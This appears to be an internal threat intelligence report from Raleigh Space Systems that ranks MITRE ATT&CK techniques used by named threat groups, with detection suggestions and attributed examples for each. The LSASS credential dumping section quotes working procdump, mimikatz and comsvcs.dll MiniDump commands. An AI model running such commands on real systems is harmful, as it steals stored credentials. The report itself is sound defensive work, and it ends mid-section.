[TLP](https://www.first.org/tlp/): Amber+Strict



![Raleigh Space Systems team Logo](RSS_Logo.png "Raleigh Space Systems team Logo")


[TLP](https://www.first.org/tlp/): Amber+Strict




## Priority Tactics, Techniques, and Procedures Report

### Summary

The following report details the Tactics, Techniques, and Procedures (TTP) used by Threat Actors identified by the Raleigh Space Systems Cyber Threat Intelligence Team as having a high intent to compromise Raleigh Space Systems. The TTPs are organized according to [MITRE's ATT&CK Navigator](https://attack.mitre.org/). 

### Goals 

The goal of the TTP Prioritization is to identify TTPs that are used multiple times by the same threat actor, and TTPs that are used by multiple threat actors, in order to prioritize detection, threat hunting, and prevention efforts. 

### Methodology 

To identify threat actor activities, first the relevant threat actors must be identified. This process was tracked as the Threat Actor Prioritization (TAP). Once priority threat actors are identified, their activities must also be identified. There are two methods used for identifying Threat Actor activity. the first method involves using [ATT&CK publicly available Threat Actor profiles](https://attack.mitre.org/groups/). The second involves researching the recent activities of the threat actors, preferably using a Threat Intelligence platform such as Recorded Future. 


### Priority Tactics, Techniques, and Procedures 



### [Acquire Infrastructure: Domains (T1583.001)](https://attack.mitre.org/techniques/T1583/001)
#### Score: 25
#### Description:
Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.

Adversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute "IDN homograph attacks," creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)

Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique)

Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)

Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)

In addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor’s choosing.(Citation: Invictus IR DangerDev 2024)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Domain Name: Passive DNS
- Domain Name: Domain Registration
- Domain Name: Active DNS
### Detection Suggestions:
Domain registration information is, by design, captured in public registration logs. Consider use of services that may aid in tracking of newly acquired domains, such as WHOIS databases and/or passive DNS. In some cases it may be possible to pivot on known pieces of domain registration information to uncover other infrastructure purchased by the adversary. Consider monitoring for domains created with a similar structure to your own, including under a different TLD. Though various tools and services exist to track, query, and monitor domain name registration information, tracking across multiple DNS infrastructures can require multiple tools/services or more advanced analytics.(Citation: ThreatConnect Infrastructure Dec 2020)

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access and Command and Control.
#### Examples: 
- APT28 registered domains imitating NATO, OSCE security websites, Caucasus information resources, and other organizations.[[1]](https://web.archive.org/web/20151022204649/https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf)[[2]](https://www.justice.gov/opa/page/file/1098481/download)[[3]](https://blog.google/threat-analysis-group/update-threat-landscape-ukraine)
- Lazarus Group has acquired domains related to their campaigns to act as distribution points and C2 channels.[[4]](https://us-cert.cisa.gov/ncas/alerts/aa21-048a)[[5]](https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/)
- menuPass has registered malicious domains for use in intrusion campaigns.[[6]](https://www.justice.gov/opa/pr/two-chinese-hackers-associated-ministry-state-security-charged-global-computer-intrusion)[[7]](https://www.justice.gov/opa/page/file/1122671/download)
### [OS Credential Dumping: LSASS Memory (T1003.001)](https://attack.mitre.org/techniques/T1003/001)
#### Score: 25
#### Description:
Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run using:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

Built-in Windows tools such as `comsvcs.dll` can also be used:

* <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)

Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)

Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)

The following SSPs can be used to access credentials:

* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)
* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)

#### Raleigh Space Systems Analysis: 
### Data Sources:
- Process: Process Access
- Windows Registry: Windows Registry Key Modification
- Process: Process Creation
- Process: OS API Execution
- Logon Session: Logon Session Creation
- Command: Command Execution
- File: File Creation
### Detection Suggestions:
Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.

On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.

Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.
#### Examples: 
- APT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims.[[1]](http://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part-2.pdf)[[2]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf) They have also dumped the LSASS process memory using the MiniDump function.[[3]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- APT33 has used a variety of publicly available tools like LaZagne, Mimikatz, and ProcDump to dump credentials.[[4]](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)[[5]](https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html)
- Volt Typhoon has attempted to access hashed credentials from the LSASS process memory space.[[6]](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)[[7]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Data from Local System (T1005)](https://attack.mitre.org/techniques/T1005)
#### Score: 25
#### Description:
Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration.

Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.

#### Raleigh Space Systems Analysis: 
### Data Sources:
- Process: OS API Execution
- Script: Script Execution
- Command: Command Execution
- Process: Process Creation
- File: File Access
### Detection Suggestions:
Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to collect files such as configuration files with built-in features native to the network device platform.(Citation: Mandiant APT41 Global Intrusion )(Citation: US-CERT-TA18-106A) Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

For network infrastructure devices, collect AAA logging to monitor `show` commands that view configuration files. 
#### Examples: 
- APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.[[1]](https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/)[[2]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf)[[3]](https://documents.trendmicro.com/assets/white_papers/wp-pawn-storm-in-2019.pdf)[[4]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- APT37 has collected data from victims' local systems.[[5]](https://services.google.com/fh/files/misc/apt37-reaper-the-overlooked-north-korean-actor.pdf)
- Lazarus Group has collected data and files from compromised networks.[[6]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[7]](https://web.archive.org/web/20190508165631/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Loaders-Installers-and-Uninstallers-Report.pdf)[[8]](https://web.archive.org/web/20220608001455/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf)[[9]](https://securelist.com/lazarus-threatneedle/100803/)
- menuPass has collected various files from the compromised computers.[[10]](https://www.justice.gov/opa/pr/two-chinese-hackers-associated-ministry-state-security-charged-global-computer-intrusion)[[11]](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage)
- Volt Typhoon has stolen files from a sensitive file server and the Active Directory database from targeted environments, and used Wevtutil to extract event log information.[[12]](https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF)[[13]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)[[14]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Masquerading: Match Legitimate Resource Name or Location (T1036.005)](https://attack.mitre.org/techniques/T1036/005)
#### Score: 25
#### Description:
Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. 

This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes Backdoor 2023)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- File: File Metadata
- Image: Image Metadata
- Process: Process Metadata
- Process: Process Creation
### Detection Suggestions:
Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.

If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)

In containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.
#### Examples: 
- APT28 has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page.[[1]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- Lazarus Group has renamed malicious code to disguise it as Microsoft's narrator and other legitimate files.[[2]](https://us-cert.cisa.gov/ncas/analysis-reports/ar20-133b)[[3]](https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns)
- menuPass has been seen changing malicious files to appear legitimate.[[4]](https://www.justice.gov/opa/page/file/1122671/download)
- Volt Typhoon has used legitimate looking filenames for compressed copies of the ntds.dit database and used names including cisco_up.exe, cl64.exe, vm3dservice.exe, watchdogd.exe, Win.exe, WmiPreSV.exe, and WmiPrvSE.exe for the Earthworm and Fast Reverse Proxy tools.[[5]](https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF)[[6]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)[[7]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Command and Scripting Interpreter: Windows Command Shell (T1059.003)](https://attack.mitre.org/techniques/T1059/003)
#### Score: 25
#### Description:
Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)

Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Command: Command Execution
- Process: Process Creation
### Detection Suggestions:
Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.
#### Examples: 
- An APT28 loader Trojan uses a cmd.exe and batch script to run its payload.[[1]](https://pan-unit42.github.io/playbook_viewer/) The group has also used macros to execute payloads.[[2]](https://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html)[[3]](https://researchcenter.paloaltonetworks.com/2018/11/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/)[[4]](https://www.accenture.com/t20181129T203820Z__w__/us-en/_acnmedia/PDF-90/Accenture-snakemackerel-delivers-zekapab-malware.pdf#zoom=50)[[5]](https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html)
- APT37 has used the command-line interface.[[6]](https://services.google.com/fh/files/misc/apt37-reaper-the-overlooked-north-korean-actor.pdf)[[7]](https://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html)
- Lazarus Group malware uses cmd.exe to execute commands on a compromised host.[[8]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)[[9]](https://web.archive.org/web/20160303200515/https:/operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf)[[10]](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/lazarus-resurfaces-targets-global-banks-bitcoin-users/)[[11]](https://www.us-cert.gov/sites/default/files/publications/MAR-10135536.11.WHITE.pdf)[[12]](https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns) A Destover-like variant used by Lazarus Group uses a batch file mechanism to delete its binaries from the system.[[13]](https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/)
- menuPass executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.[[14]](https://web.archive.org/web/20220224041316/https:/www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf)[[15]](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf)[[16]](https://github.com/Twi1ight/AD-Pentest-Script/blob/master/wmiexec.vbs)[[17]](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html) menuPass has used malicious macros embedded inside Office documents to execute files.[[18]](http://web.archive.org/web/20220810112638/https:/www.accenture.com/t20180423T055005Z_w_/se-en/_acnmedia/PDF-76/Accenture-Hogfish-Threat-Analysis.pdf)[[17]](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)
- Volt Typhoon has used the Windows command line to perform hands-on-keyboard activities in targeted environments including for discovery.[[20]](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)[[21]](https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF)[[22]](https://www.secureworks.com/blog/chinese-cyberespionage-group-bronze-silhouette-targets-us-government-and-defense-organizations)[[23]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Phishing: Spearphishing Attachment (T1566.001)](https://attack.mitre.org/techniques/T1566/001)
#### Score: 25
#### Description:
Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. 
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Network Traffic: Network Traffic Content
- Network Traffic: Network Traffic Flow
- Application Log: Application Log Content
- File: File Creation
### Detection Suggestions:
Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.

Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.

Monitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)
#### Examples: 
- APT28 sent spearphishing emails containing malicious Microsoft Office and RAR attachments.[[1]](https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/)[[2]](https://researchcenter.paloaltonetworks.com/2018/03/unit42-sofacy-uses-dealerschoice-target-european-government-agency/)[[3]](https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/)[[4]](https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf)[[5]](https://securelist.com/a-slice-of-2017-sofacy-activity/83930/)[[6]](https://www.accenture.com/t20181129T203820Z__w__/us-en/_acnmedia/PDF-90/Accenture-snakemackerel-delivers-zekapab-malware.pdf#zoom=50)[[7]](https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html)[[8]](https://www.secureworks.com/research/iron-twilight-supports-active-measures)
- APT33 has sent spearphishing e-mails with archive attachments.[[9]](https://www.microsoft.com/security/blog/2020/06/18/inside-microsoft-threat-protection-mapping-attack-chains-from-cloud-to-endpoint/)
- APT37 delivers malware using spearphishing emails with malicious HWP attachments.[[10]](https://services.google.com/fh/files/misc/apt37-reaper-the-overlooked-north-korean-actor.pdf)[[11]](https://blog.talosintelligence.com/2018/01/korea-in-crosshairs.html)[[12]](https://securelist.com/scarcruft-continues-to-evolve-introduces-bluetooth-harvester/90729/)
- Lazarus Group has targeted victims with spearphishing emails containing malicious Microsoft Word documents.[[13]](https://securingtomorrow.mcafee.com/mcafee-labs/hidden-cobra-targets-turkish-financial-sector-new-bankshot-implant/)[[14]](https://securelist.com/lazarus-threatneedle/100803/)[[15]](https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)[[16]](https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns)
- menuPass has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.[[17]](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf)[[18]](https://www.fireeye.com/blog/threat-research/2017/04/apt10_menupass_grou.html)[[19]](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)[[20]](https://www.justice.gov/opa/page/file/1122671/download)
### [Obtain Capabilities: Tool (T1588.002)](https://attack.mitre.org/techniques/T1588/002)
#### Score: 25
#### Description:
Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)

Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Malware Repository: Malware Metadata
### Detection Suggestions:
In some cases, malware repositories can also be used to identify features of tool use associated with an adversary, such as watermarks in [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing CS Dec 2020)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.
#### Examples: 
- APT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder.[[1]](https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/)[[2]](https://securelist.com/a-slice-of-2017-sofacy-activity/83930/)[[3]](https://web.archive.org/web/20171202185937/https://www.fireeye.com/blog/threat-research/2017/08/apt28-targets-hospitality-sector.html)
- APT33 has obtained and leveraged publicly-available tools for early intrusion activities.[[4]](https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-a-potentially-destructive-adversary.html)[[5]](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage)
- Lazarus Group has obtained a variety of tools for their operations, including Responder and PuTTy PSCP.[[6]](https://securelist.com/lazarus-threatneedle/100803/)
- menuPass has used and modified open-source tools like Impacket, Mimikatz, and pwdump.[[7]](https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf)
- Salt Typhoon has used publicly available tooling to exploit vulnerabilities.[[8]](https://blog.talosintelligence.com/salt-typhoon-analysis/)
- Volt Typhoon has used legitimate network and forensic tools and customized versions of open-source tools for C2.[[9]](https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/)[[10]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [External Remote Services (T1133)](https://attack.mitre.org/techniques/T1133)
#### Score: 20
#### Description:
Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)

Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.

Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)
#### Raleigh Space Systems Analysis: 
### Data Sources:
- Network Traffic: Network Connection Creation
- Network Traffic: Network Traffic Flow
- Logon Session: Logon Session Metadata
- Application Log: Application Log Content
- Network Traffic: Network Traffic Content
### Detection Suggestions:
Follow best practices for detecting adversary use of [Valid Accounts](https://attack.mitre.org/techniques/T1078) for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.

When authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application.
#### Examples: 
- APT28 has used Tor and a variety of commercial VPN services to route brute force authentication attempts.[[1]](https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF)
- Volt Typhoon has used VPNs to connect to victim environments and enable post-exploitation actions.[[2]](https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf)
### [Automated Collection (T1119)](https://attack.mitre.org/techniques/T1119)
#### Score: 20
#### Description:
Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. 

In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) 

This functionality could also be built into remote access tools. 

This technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.
#### Raleigh Space Systems Analysis: 
### Data Sources:
- User Account: User Account Authentication
- Command: Command Execution
- File: File Access
- Script: Script Execution
### Detection Suggestions:
